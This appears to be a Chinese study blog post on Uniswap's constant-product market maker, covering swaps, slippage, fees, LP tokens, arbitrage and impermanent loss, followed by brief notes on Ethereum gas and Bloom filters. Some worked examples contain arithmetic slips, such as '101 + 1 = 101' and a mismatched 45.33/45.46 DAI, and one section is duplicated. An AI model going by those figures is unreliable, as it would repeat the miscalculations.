<p>在订单薄模型市场中，买家期望用最低的价格买到想要的资产，而卖家则是期望用最高价格卖出同一项资产，如果交易要成立，买卖双方必须要在价格上达成共识，一是买家提高出价，而是卖家降低出价，如果双方都不要改变出价，这时候就要依靠做市商的参与，简单来说，做市商是一个促进交易的实体，它会在买卖两个方向上挂单，让想要交易的参与方只要跟做市商的订单撮合就能完成交易，而不需要等待对手方出现才能交易，极大的提高了市场的流动性。</p>
<p>为什么Uniswap不采用订单薄模型？</p>
<p>Uniswap部署在以太坊上，而以太坊每秒可以出来15笔左右的交易，这对于订单薄交易所来不可行，主要原因是：“订单薄模型依赖一个或多个外部做市商对某项资产一直不断的做市，而以太坊的TPS过低不支持做市商高频的交易，如果缺少了做市商，那么交易所的流动性立刻会降低，对于用户来说这样的交易所体验很差。”</p>
<p>Uniswap采用流动池加恒定乘法公式这种自动化做市商（AMM）模式实现了资产的交换，自动化做市商模式方式不需要买卖双方进行挂单，也不要买卖双方的订单重叠，可以进行自由买卖。</p>
<ul>
<li>流动池：使用流动池来提供买卖双方交易，做市商只要把资金放入流动池即可</li>
<li>恒定乘法公式：按照流动池中Token的数量，自动计算买卖价格</li>
</ul>
<h3 id="流动池"><a href="#流动池" class="headerlink" title="流动池"></a><strong>流动池</strong></h3><p>流动池就是锁定在智能合约中所有的代币以及资金的总称，流动是资金转为代币，或代币转为资金的意思。</p>
<p>一个完整的流动池分为2个部份，分别表示不同的货币，成为一个交易对，在Uniswap V1中就是ETH及ERC20代币，在Uniswap V2中是支持不同ERC20代币直接交换，所以在Uniswap V2中的流动池可以允许两边是不相同的ERC20代币，其中ETH会自动转换成以WETH代币。为了简化，直接以ETH-ERC20交易对作为例子。</p>
<p>如下图所示，Uniswap将所有做市商的ETH集合在一起放在流动池左边， 将所有ERC20集合在一起放在流动池的右边。如果有用户要买ERC20代币，就从流动池的右边将ERC20代币转给用户，同时将用户支付的ETH添加的流动池的左边，然后重新计算流动池中的价格，等待下次交易。 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233121.jpg" alt="img"></p>
<p><strong>恒定乘积公式</strong></p>
<p>Uniswap用来确定token交易汇率的恒定乘积公式，最初来源自2018年3月Vitalik Buterin发表过的一篇文章中。此文中表述，根据以下公式来计算ERC20代币的交易汇率：</p>
<p>x*y &#x3D; k</p>
<p>k 表示一个不变的常数；x 和 y 表示特定交易对中ETH和ERC20代币的可用数量。</p>
<p>对于Uniswap而言，则是该ERC20代币和ETH的交易合约中ETH和该ERC20代币的流动性池的储备量。在这个公式中，该ERC20代币和ETH的兑换汇率，将始终处于此公式结果曲线上的某一点。</p>
<p>这个公式是Uniswap协议的组成部分，Vitalik Buterin使用下面这个图来对其进行描述：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233122.jpg" alt="img"></p>
<p>使用此公式，如果以Uniswap中的交易合约举例，则代表该交易合约储备有 x 数量的A代币和 y 数量的B代币。这个合约将始终保持乘积恒定，也就是说 x * y 得到的 k 值不变。</p>
<p>任何人都可以通过有效改变做市商在 x* y 曲线上的位置来进行买入或者卖出代币。</p>
<p>横轴代表卖出的A代币的数量，纵轴代表买入的B代币的数量。</p>
<p>假设B代币是ETH，而A代币是任意一种ERC20代币，我们可以通过 x * y &#x3D; k 的公式来理解一下它们的功能：</p>
<p>如果Alice决定买入大量A代币，那么将导致A代币的紧缺，并且导致ETH数量的增加。Alice购买的行为导致了把汇率移动到了 x * y &#x3D; k 曲线上的另一个点。红点将向左移动，也就是买入A代币的价格变得更加高。也可以将Uniswap的交易合约中的ETH和A代币的相对供应理解为A代币的供需关系，这种供需关系决定了A代币与ETH之间的汇率。</p>
<p>如前所述，第一个为交易合约提供流动性的充值操作，并不取决于交易汇率。而是反过来，后面的交易汇率，将取决于第一次为交易合约提供流动性的这个充值操作充值了多少ETH和ERC20代币，用第一个流动性提供者认为的等值，来反映ERC20&#x2F;ETH的兑换汇率。如果这个汇率和市场对比过高或者过低，<strong>套利交易者</strong>都会很快把差距抹平，直到市场正常水平。</p>
<p><strong>Uniswap 上的交易类型：ETH ⇄ ERC20 交易</strong></p>
<p>在Uniswap上可以进行的交易中的一种，就是ETH和ERC20代币之间的交易。就像前面提到的，这个交易对的汇率取决于此交易合约内ETH和该 ERC20代币流动性池的相对规模。这个交易汇率是由Uniswap的恒定乘积公式来决定的：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ETH 池 * token 池 = 恒定乘积值</span><br></pre></td></tr></table></figure>

<p>在Uniswap上执行任何交易，此恒定乘积值都保持不变。只有当此交易合约中的流动性池发生变化的时候，此恒定乘积值才会发生变化。</p>
<p>我们用 ETH ⇄ DAI（一种ERC20代币）来举例：【本例中不考虑手续费】</p>
<p>Bob想要发起交易来用自己的1个ETH兑换成ERC20代币DAI，Bob将使用 Uniswap上已经存在的DAI交易合约来实现此兑换操作。此时，流动性提供者已经将一定量的ETH和DAI存在了交易合约中。我们这里举例，流动性提供者一共存了10 ETH和500 DAI。因此，基础的恒定乘积值为：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ETH 池 * DAI 池 = 恒定乘积值</span><br><span class="line">ETH 池 = 10</span><br><span class="line">DAI 池 = 500</span><br><span class="line">恒定乘积值 = 500 * 10 = 5000</span><br></pre></td></tr></table></figure>

<p>Bob将通过向交易合约的ETH池发送1 ETH来启动这笔交易，该1个ETH被添加到了ETH池中。然后，恒定乘积值除ETH池中新的ETH数量，来得到DAI池中应该有的数量。那么多出来的DAI，就可以分给Bob了。具体如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Bob发送了 1 ETH</span><br><span class="line">ETH 池 = 10 + 1 = 11</span><br><span class="line">DAI 池 = 5000/11 = 454.54</span><br><span class="line">Bob 将兑换得到 : 500–454.54 = 45.46 DAI</span><br></pre></td></tr></table></figure>

<p>在这次交易中，Bob兑换的汇率为 45.46 DAI&#x2F;ETH</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1 ETH 入</span><br><span class="line">45.33 DAI 出</span><br><span class="line">汇率 = 45.46 DAI/ETH</span><br></pre></td></tr></table></figure>

<p>上面的计算过程，大家觉得有什么问题吗？可以继续计算例子来感受下【同样不考虑交易费】：</p>
<p>Bob想要再次发起交易来用自己的1个ETH兑换成ERC20代币DAI，当前的恒定乘积依然是5000：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ETH 池 * DAI 池 = 恒定乘积值</span><br><span class="line">ETH 池 = 11</span><br><span class="line">DAI 池 = 5000/11 = 454.54</span><br><span class="line">恒定乘积值 = 11 × 5000/11 = 5000</span><br></pre></td></tr></table></figure>

<p>重复之前的过程，这个ETH被添加到ETH池中，从而ETH池中有12个币，再次计算DAI池中应该保留的DAI币的数量。具体如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Bob发送了 1 ETH</span><br><span class="line">ETH 池 = 11 + 1 = 12</span><br><span class="line">DAI 池 = 5000/12 = 416.66</span><br><span class="line">Bob 将兑换得到 : 454.54–416.66 = 37.88 DAI</span><br></pre></td></tr></table></figure>

<p>在这次交易中，Bob兑换的汇率为 37.88 DAI&#x2F;ETH</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1 ETH 入</span><br><span class="line">37.88 DAI 出</span><br><span class="line">汇率 = 37.88 DAI/ETH</span><br></pre></td></tr></table></figure>

<p>发现了什么问题呢？DAI币的价格上涨了。在刚创建流动资产时，可以认为一个ETH可以换50个DAI，1个DAI等于0.02个ETH，则经过第一次兑换之后，1个DAI则等于0.022个以太坊，相当于有10%的价格上涨。</p>
<p>如果第二次有人再购买1ETH，这时候Uniswap只返回了37.88个DAI，相当于1 DAI&#x3D;0.0264个ETH，又上涨了20%。</p>
<p>这里介绍一个新的概念，滑点。滑点是指用户最终实现兑换的汇率偏离了真实的汇率。譬如上面Bob第一次使用ETH购入DAI时，看到池中的比例，认为自己应该获得50个DAI，但实际上只获得了 45.46个。这个时候，相当于用户承受了损失。那么如何降低滑点呢？再看一个例子。</p>
<p>假设Bob想要发起交易来用自己的1个ETH兑换成ERC20代币DAI，Bob发现此时以太坊上有两个Uniswap合约提供兑换功能。一个合约的资金池是10 ETH和500 DAI，另一个合约的资金池中流动性提供者一共存了100ETH和5000 DAI【也即此时的兑换币也是1:50】。那么Bob应该选取哪个合约进行兑换呢？上面我们已经讨论了恒定积为5000的例子，现在我们讨论下恒定积为500,000的例子。现在的基础的恒定乘积值为：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ETH 池 * DAI 池 = 恒定乘积值</span><br><span class="line">ETH 池 = 100</span><br><span class="line">DAI 池 = 5000</span><br><span class="line">恒定乘积值 = 5000 * 100 = 500，000</span><br></pre></td></tr></table></figure>

<p>Bob将通过向交易合约的ETH池发送1 ETH来启动这笔交易，该1个ETH被添加到了ETH池中。然后，恒定乘积值除ETH池中新的ETH数量，来得到DAI池中应该有的数量。那么多出来的DAI，就可以分给Bob了。具体如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Bob发送了 1 ETH</span><br><span class="line">ETH 池 = 101 + 1 = 101</span><br><span class="line">DAI 池 = 500，000/101 = 4950.50</span><br><span class="line">Bob 将兑换得到 : 5000–4950.50 = 49.50 DAI</span><br></pre></td></tr></table></figure>

<p>在这次交易中，Bob兑换的汇率为 49.50 DAI&#x2F;ETH</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1 ETH 入</span><br><span class="line">49.50 DAI 出</span><br><span class="line">汇率 = 49.50 DAI/ETH</span><br></pre></td></tr></table></figure>

<p>因此，从上面的例子中可以看出，当兑换金额相对于兑换池资金量过大，或者说对于一定的兑换金额，兑换池资金太少时，就会出现较大滑点。但当兑换池中的代币数量充足时，滑点的数额就会减少，而且资金越多，滑点越小。滑点的大小和常说的交易深度【<strong>交易深度</strong>是指市场在承受大额交易时币价不出现大幅波动的能力】大小相反，滑点越小，交易深度越大，用户越能够按照稳定的价格完成交易。</p>
<p>因此，为了吸引用户，Uniswap合约中需要有足够大的资金池，但是Uniswap无法自己变出钱来，因此需要依赖外部资金向合约中注入资金，以提供流动性，向Uniswap流动池中提供流动性的用户被称为流动性提供者。但是Uniswap如何吸引流动性提供者呢？</p>
<p>当流动性提供者向Uniswap中注入流动性的时候，Uniswap会铸造出一个流动性代币，铸出代币数量是与用户注入的资金所占流动池中的资金比例相关，流动性提供者可以选择在任何时间销毁自己持有的流动性代币。为了鼓励用于向Uniswap的流动池中提供更多的流动性，Uniswap会从每笔交易总额中抽取0.3%当成交易手续费，并将手续费全额交给那些将注资金到Uniswap资金池提供流动性的流动性提供者。</p>
<p>在上面的例子中，流动性提供者需要将等值的ETH以及ERC20代币充值到交易合约中。第一个向此合约中提供流动性的流动性提供者就拥有设置此ERC20代币与ETH之间兑换汇率的权利。第一个流动性提供者把自己认为等价值的ETH数量和ERC20代币数量充值到此交易合约，就可以实现设置汇率。而如果第一个流动性提供者设置的这个汇率和外面更大盘的市场不一致，那么套利交易者就会通过交易来把这些价差抹平，和大盘保持一致的汇率。此后所有流动性提供者将以其充值时的汇率作为计算等价的依据。</p>
<p>接下来再看一个例子，在有交易费用的情况下，如何影响用户的兑换率。</p>
<p>考虑资金池中有10个ETH和500个DAI的情况，Bob将通过向交易合约的ETH池发送1ETH来启动交易，此时，交易金额的0.3%也就是0.003ETH将被扣除作为给流动性提供者的报酬。剩余的0.997ETH则被添加到了ETH池里面。然后，恒定乘积值除ETH池中新的ETH数量，来得到DAI池中应该有的数量。那么多出来的DAI，就可以分给Bob了。具体如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Bob发送了 1 ETH</span><br><span class="line">费用 = 0.003 ETH</span><br><span class="line">ETH 池 = 10 + (1–0.003) = 10.997</span><br><span class="line">DAI 池 = 5000/10.997 = 454.67</span><br><span class="line">Bob 将兑换得到 : 500–454.67 = 45.33 DAI</span><br></pre></td></tr></table></figure>

<p>在Bob开始交易时收取的流动性提供者费用，现在又重新添加到ETH流动池里面。这是对流动性提供者的一种报酬，当这些流动性提供者从流动池中取回自己的ETH和ERC20代币时，可以获得这些报酬【也即当LP退出的时候，才真正拿走】。由于这些流动性提供者的报酬是在上述兑换交易计算后才添加回ETH流动池里面，因此在交易合约上每执行一次交易，恒定乘积值就会增加一点，这就让流动性提供者为交易合约提供流动性这件事儿，成为一种有利可图的行为。这笔交易完成后，</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ETH 池 = 10.997 + 0.003 = 11</span><br><span class="line">DAI 池 = 454.67</span><br><span class="line">新的恒定乘积值 = 5,001.37</span><br></pre></td></tr></table></figure>

<p>在这次交易中，Bob兑换的汇率为 45.33 DAI&#x2F;ETH</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1 ETH 入</span><br><span class="line">45.33 DAI 出</span><br><span class="line">汇率 = 45.33 DAI/ETH</span><br></pre></td></tr></table></figure>

<p>可以看出，相比于没有手续费的情况，Bob的兑换率是降低了；同时，恒定乘积值变大了。多出来的部分实际上就是流动性提供者的报酬。如果此时流动性提供者退出，那么就会拿走报酬，同时因为资金池中相应比率的资金的减少，恒定乘积会降低。</p>
<p>看公式，相当于是对之前例子的抽象。</p>
<p>不考虑手续费的计算公式：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233123.jpg" alt="img"></p>
<p>对于不理解上面公式的同学，可以参考以下表格中的数据自己在excel中手动演算一遍，可以更直观的理解Uniswap的工作原理。 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233124.jpg" alt="img"></p>
<p>加入手续费的恒定乘积公式：以下过程是在计算手续费的情况下，将上面的公式重新推导了一遍。计算交易价格 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233125.jpg" alt="img"></p>
<p>上面的公式中， $\alpha$ 是真实的买家的付出的比例；但是在计算y值的时候，去除了手续费，因此，得到更多的y值。也即</p>
<p>$(1+\alpha)*(1-\beta)&#x3D;1$</p>
<p>变成了$(1+\alpha\gamma)(1-\beta)&#x3D;1$ </p>
<p>所以， $\alpha$和$\beta$  的关系就从</p>
<p>$\alpha&#x3D;\frac{\beta}{1-\beta}$</p>
<p>变成了</p>
<p>$\alpha&#x3D;\frac{\beta}{1-\beta}\frac{1}{\gamma}$</p>
<p>k除了在有交易手续费的情况会变大，还有一个情况也会使k值产生变化，当向流动池中增加流动性的时候k会变大，当从流动池中取回流动资金时k会变小。具体变化比例可以参考Uniswap白皮书。 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233126.jpg" alt="img"></p>
<hr>
<p>接下来，讨论下，流动性提供者提供资金时的比例和影响。因为恒定乘积公式的K越大，也就是资金池里的资金越多时，代币交换滑点越小，流动性也就越好。所以，AMM模式鼓励用户为兑换资金池提供流动性，方式就是用户向流动性资金池中存入等价值的2种代币，比如上面例子里，用户同时存入10个ETH 和500个DAI，得到20个ETH和1000个DAI，此时能够位置ETH和DAI的比例。如果用户存入的2种代币不等值，比如他存入了10个ETH和50个DAI，（此时的市价还是1个ETH换50个DAI）这会造成兑换池里ETH的供给相对过剩，ETH和DAI的相对价值就出现了不平衡，此时池中的供应量是20个ETH和550个DAI。相当于一个ETH只能换27.5个DAI。此时套利者就可以在外部购入DAI，然后在该合约中兑换ETH，从而进行获利。</p>
<p>可以来计算一下，此时资金池中共有</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ETH 池 = 20</span><br><span class="line">DAI 池 = 550</span><br><span class="line">新的恒定乘积值 = 20 * 550 = 11000 </span><br></pre></td></tr></table></figure>

<p>套利者此时可以使用DAI来兑换ETH。此时，套利者可以向合约中存入191.6个DAI，来兑换相应的ETH。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">套利者发送了 191.6 DAI</span><br><span class="line">DAI 池 = 550 + 191.6 =741.6</span><br><span class="line">ETH 池 = 11000 / 741.6 = 14.83</span><br><span class="line">Bob 将兑换得到 : 20–14.83 = 5.17 ETH</span><br><span class="line"></span><br><span class="line">套利者获利</span><br><span class="line">5.17 - 191.6/50 = 5.17 - 3.832 = 1.338 ETH </span><br><span class="line">资金池恢复平衡</span><br><span class="line">741.6 / 14.83 = 50</span><br></pre></td></tr></table></figure>

<p>套利者如何计算得出应该存入191.6个DAI呢？</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">（550 + x） * (20 - y) = 11000</span><br><span class="line"> (550 + x) / (20 - y) = 50</span><br></pre></td></tr></table></figure>

<p>上面讨论了Uniswap通过给流动性提供者的奖励，也即交易所的手续费，手续费率为0.3%，流动性提供者之间依据存入资金的份额按比例分配。加入一天的成交额是40.85亿CNY，那么一天的手续费就有122万元，经过一段时间的积累，流动性提供者（LP）得到的手续费奖励金额就非常可观了。Uniswap会根据流动性提供者存入资金的数额发给他们一定数量的LP token，我们可以理解为存款奖状或者收据，它是LP获得交易所手续费奖励的凭证。</p>
<p>举个例子具体说明：假设这个交易对是ETH–DAI，目前兑换比例是1ETH–50DAI。我向资金池充了1ETH和50DAI，这个资金池发给我1个LP token，代表我有1份（ETH–DAI）的流动性贡献。这个资金池所产生的手续费进入一个pool，经过一段时间后，pool中共有积累的手续费A个ETH和B个DAI，当我把我的1个LP token交还给Uniswap时，我有权利从pool拿走它按比例对应的手续费。假设此时整个资金池共发出了X个LP token，我的流动性贡献占比就是1&#x2F;X，我就可以获得A&#x2F;X个ETH和B&#x2F;X个DAI【手续费】，然后再赎回我的1ETH和50DAI。</p>
<p>Uniswap通过AMM模式和为流动性提供者奖励手续费的模式，极大地调动了LP的积极性。由于任何人都可以提供流动性并且从中获利，人们有动力为Uniswap提供流动性；交易所获得充足的交易流动性，交易滑点就小，用户体验也好。交易所的运行完全基于市场的需求进行。人工的运维成本大幅降低。</p>
<p>在Uniswap中，交易产品的挂牌会是免费的。而且由于不需要再用交易订单的模式，而且流动性也不需要专门的做市商来提供，因此目前证券市场中的做市商的成本就可以取消。降低了上币成本和做市成本，Uniswap对DeFi和整个区块链行业的发展起到了一定的促进作用。</p>
<p>但是，作为流动性提供者，虽然为Uniswap提供流动性可以交易手续费，但也存在无常损失。无偿损失是指流动性提供者按当时的市价存入2种代币，在他要取出这些代币时，它们的兑换价格发生了变化而导致的损失。如果这2种代币中某个代币大幅上涨或下跌都可能导致无常损失。注意，不管涨还是跌，都有可能导致损失。</p>
<p>还是以上面的DAI和ETH为例。当50个DAI换1个ETH时，我存入50个 DAI 和1个 ETH。假设现在行情变化，也就是DAI和ETH的兑换比例变化了：不管现在是50个DAI换2个ETH（ETH跌了），还是100个DAI换1个ETH（ETH涨了），流动性提供者如果想赎回资金，都必须按照现在的兑换比例，取出价格相等的DAI和ETH，不能破坏资金池中2种代币的比例平衡，不然套利者就又要出动了。这也就是说，流动性提供者取出来的不是存入的50 DAI和1个ETH，而是按照新的市价的兑换比例，而这相比我直接持有50 DAI和1个ETH不动，有可能会产生损失。</p>
<p>impermanent loss</p>
<p>向Uniswap中提供流动性的人会发现一个现象：“目前在流动池中资金的价值比放入流动池之前的资金价值少了，也就是资金缩水了”，这种现象被称为“impermanent loss”，impermanent loss，中文翻译成“无常损失”，简单来说impermanent loss是指你将加密货币放入uniswap中赚取的收益与你将加密货币放入钱包中的收益之间的差。</p>
<p>hold指不看币价涨跌长期持有某种加密货币（hold on for dear life）</p>
<p>impermanent loss通常是由于流动池中的价格发生波动引起的，下面看一个例子： </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233127.jpg" alt="img"></p>
<p>可以看出价格从100变成120后我们的资金只有之前的99.59%，损失了0.4%左右。只要这时候我们不将资金从流动池中取出，一旦流动池中的币价回到100时，我们是没有损失的，这是为什么叫impermanent loss无常损失的原因。</p>
<p>下图演示impermanent loss的比率与当前价格变化的关系，O列表示资金刚放入流动池的情况，O-&gt;H表示价格上涨时impermanent loss的变化，A&lt;-O表示价格下跌时impermanent loss的变化。 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233128.jpg" alt="img"></p>
<p>下图是根据上面数据画出的函数图像，蓝色的曲线是不包含手续费的，黄色的图像包含手续费，红色的线条是为了方便说明。</p>
<p>先看蓝色曲线，当不计算手续费收益的情况下，无论币价上涨或下跌，流动性提供者100%会有损失。</p>
<p>再看黄色的曲线，由于黄色曲线是计算手续费收益的，所以只要币价在一个范围内波动，流动性提供者可以稳赚手续费收益。 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233129.jpg" alt="img"></p>
<p>由此可以得出一个结论要介绍impermanent loss对流动性提供者的影响，可以为两个币价之间波动小的流动池提供流动性。 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233130.jpg" alt="img"></p>
<p>· mean-reverting pairs：均值回归的交易对，比如稳定币交易对两者波动是最小的，可以最大程度减少impermanent loss · correlated pairs：有正相关性的交易对，例如ETH&#x2F;ZRX，这两个币的波动方向基本上是一致的，同涨同跌，两者之间的相对波动小 · Uncorrelated pairs：非相关性的交易对，如ETH&#x2F;D<a href="https://link.zhihu.com/?target=http://jizhid.com/number/ai/">AI</a>，为这种交易对提供流动性，赚取的交易费有可能会覆盖impermanent loss · Inverse correlated pairs：负相关的交易对，是最危险的，他们之间波动方向相反，两者之间的相对波动范围最大。</p>
<p>下面是计算impermanent loss的公式 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233131.jpg" alt="img"></p>
<hr>
<p>看公式，相当于是对之前例子的抽象。</p>
<p>不考虑手续费的计算公式：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233123.jpg" alt="img"></p>
<p>对于不理解上面公式的同学，可以参考以下表格中的数据自己在excel中手动演算一遍，可以更直观的理解Uniswap的工作原理。 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233124.jpg" alt="img"></p>
<p>加入手续费的恒定乘积公式：以下过程是在计算手续费的情况下，将上面的公式重新推导了一遍。计算交易价格 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233125.jpg" alt="img"></p>
<p>上面的公式中， $\alpha$是真实的买家的付出的比例；但是在计算y值的时候，去除了手续费，因此，得到更多的y值。也即</p>
<p>$(1+\alpha)*(1-\beta)&#x3D;1$</p>
<p>变成了</p>
<p>$(1+\alpha\gamma)*(1-\beta)&#x3D;1$</p>
<p>所以,$\alpha$和$\beta$的关系就从</p>
<p>$\alpha&#x3D;\frac{\beta}{1-\beta}$</p>
<p>变成了</p>
<p>$\alpha&#x3D;\frac{\beta}{1-\beta}\frac{1}{\gamma}$</p>
<p>除了在有交易手续费的情况会变大，还有一个情况也会使k值产生变化，当向流动池中增加流动性的时候k会变大，当从流动池中取回流动资金时k会变小。具体变化比例可以参考Uniswap白皮书。 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233126.jpg" alt="img"></p>
<p><strong>总结</strong></p>
<p>优点</p>
<p>完全去中心化，不依赖第三方，任何人都可以基于uniswap构建自己的应用<br>可以自由地创建任何ERC20交易对<br>与其他去中心化交易所相比gas费用更低<br>任何人都可以向uniswap流动池中提供流动性，人人都可以是做市商</p>
<p>缺点</p>
<p>需要依赖套利者去平衡uniswap与外部交易所之间的汇率<br>对大户不友好，进行大额的交易会造成很大的滑点 </p>
<hr>
<p>了解Uniswap的原理之后，再来看一下疯狂的币圈。</p>
<p>Uniswap的恒定乘积机制决定了，哪一边的买入数量多，价格就会上升，同时如果买入的越晚，上涨的幅度则越快。所以，一旦一个Uniswap的代币进入了大多数人的视野，不断上涨的币价让追涨杀跌的韭菜们争先恐后的买入，从而进一步推动价格上涨，直到没有人再买了，就开启同样的快速下跌过程。CoinGecko数据显示，从5月30日到6月5日，STA币价从几乎为空气价的0.00001元一路涨至约1元，上涨约10万倍。然后又快速下跌。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233132.jpg" alt="img"></p>
<p><a href="https://link.zhihu.com/?target=https://www.chainnode.com/post/466619">https://www.chainnode.com/post/466619www.chainnode.com</a><a href="https://link.zhihu.com/?target=https://www.qklw.com/top/20200710/100667.html">Uniswap上庄家的收割套路 - 区块链网www.qklw.com<img src="https://pic3.zhimg.com/v2-64e626cb3c3ecd6faa0c616a08cddc62_ipico.jpg" alt="图标"></a></p>
<p>参考：</p>
<ol>
<li><a href="https://zhuanlan.zhihu.com/p/167023364">https://zhuanlan.zhihu.com/p/167023364</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/167023364">https://zhuanlan.zhihu.com/p/167023364</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.chainnews.com/articles/611741523815.htm">https://www.chainnews.com/articles/611741523815.htm</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/79dbc73f8de4">https://www.jianshu.com/p/79dbc73f8de4</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.chainnode.com/post/466619">https://www.chainnode.com/post/466619</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.hulianmaibo.com/posts/info/13110">https://www.hulianmaibo.com/posts/info/13110</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.okex.com/academy/zh/taking-uniswap-curve-balancer-as-an-example-detailed-analysis-of-automatic-market-maker-amm-cn">https://www.okex.com/academy/zh/taking-uniswap-curve-balancer-as-an-example-detailed-analysis-of-automatic-market-maker-amm-cn</a> 【感觉不对；而且uniswap交易所也会跑路】</li>
<li><a href="https://link.zhihu.com/?target=https://medium.com/cortexlabs/defi%E7%A7%91%E6%99%AE%E7%B3%BB%E5%88%97%E4%B9%8B-%E4%B8%80-uniswap%E5%88%B0%E5%BA%95%E6%98%AF%E6%80%8E%E4%B9%88%E8%BF%90%E8%BD%AC%E7%9A%84-2a82c9afc1df">https://medium.com/cortexlabs/defi%E7%A7%91%E6%99%AE%E7%B3%BB%E5%88%97%E4%B9%8B-%E4%B8%80-uniswap%E5%88%B0%E5%BA%95%E6%98%AF%E6%80%8E%E4%B9%88%E8%BF%90%E8%BD%AC%E7%9A%84-2a82c9afc1df</a></li>
<li><a href="https://link.zhihu.com/?target=http://jizhid.com/number/blockchain/45304.html">http://jizhid.com/number/blockchain/45304.html</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.cailu.net/article/13113111130466711.html">https://www.cailu.net/article/13113111130466711.html</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.cnblogs.com/zdz8207/p/qkl-Uniswap.html">https://www.cnblogs.com/zdz8207/p/qkl-Uniswap.html</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.chainnode.com/post/466619">https://www.chainnode.com/post/466619</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.8btc.com/media/621174">https://www.8btc.com/media/621174</a></li>
<li><a href="https://link.zhihu.com/?target=https://learnblockchain.cn/2018/01/12/create_token/">https://learnblockchain.cn/2018/01/12/create_token&#x2F;</a> 以太坊代币</li>
</ol>
<h1 id="区块链技术复习"><a href="#区块链技术复习" class="headerlink" title="区块链技术复习"></a>区块链技术复习</h1><h2 id="gas的目的"><a href="#gas的目的" class="headerlink" title="gas的目的"></a>gas的目的</h2><p>以太坊中实现的脚本语言是图灵完备的,gas的引入可以防止用户在脚本中写死循环来坑矿工.</p>
<p>gas的目的是限制执行交易所需的工作量，同时为执行支付费用。gas 用来衡量你的这笔交易（或者合约代码调用）所消耗的资源（包括计算量，存储，带宽等）。除了计算交易的费用外,交易或者合约上传也需要费用.一笔交易所产生的转账费用会奖励给打包包含这笔交易的区块的矿工。区块不是哪个矿工产生的，所有的矿工都会竞争下一个区块的打包权，胜出者可以打包下一个区块。交易不一定会存在一个区块，它交易被广播出去后，在数秒内全网所有的节点都会接收到这笔交易。矿工会优先打包 gas 合理，gas price 高的交易。如果用户交易时所支付的矿工费非常低(out of gas), 那么这笔交易可能不会被矿工打包, 从而造成交易失败。交易运行完毕,如果有剩余,再退还给用户,如果不够,矿工也不还钱,只是把交易全部回滚</p>
<p>如果该交易需要使用的gas数量小于或等于所设置的gas limit，那么这个交易会被成功处理。如果gas总消耗超过gas limit，那么所有的操作都会被复原（回滚），但是交易费仍然会被矿工收取。区块链会显示这笔交易完成尝试，但因为没有提供足够的gas导致所有的合约命令都被复原。</p>
<p>为了克服拒绝服务和无限循环，使用0.00001以太币或1 Gas用于执行一行代码。如果没有足够的以太币，交易不会被执行。它也是为了促进代码设计者提高效率，而不是浪费带宽和CPU的利用率。</p>
<p>以太坊的交易费用&#x3D; gas 数量 * gas price (gas 单价, 以太币计价) </p>
<h4 id="为什么需要多个hash函数呢？"><a href="#为什么需要多个hash函数呢？" class="headerlink" title="为什么需要多个hash函数呢？"></a>为什么需要多个hash函数呢？</h4><p>降低误判率</p>
<p>如果哈希函数的个数多，那么在对一个不属于集合的元素进行查询时得到0的概率就大；但另一方面，如果哈希函数的个数少，那么位数组中的0就多。</p>
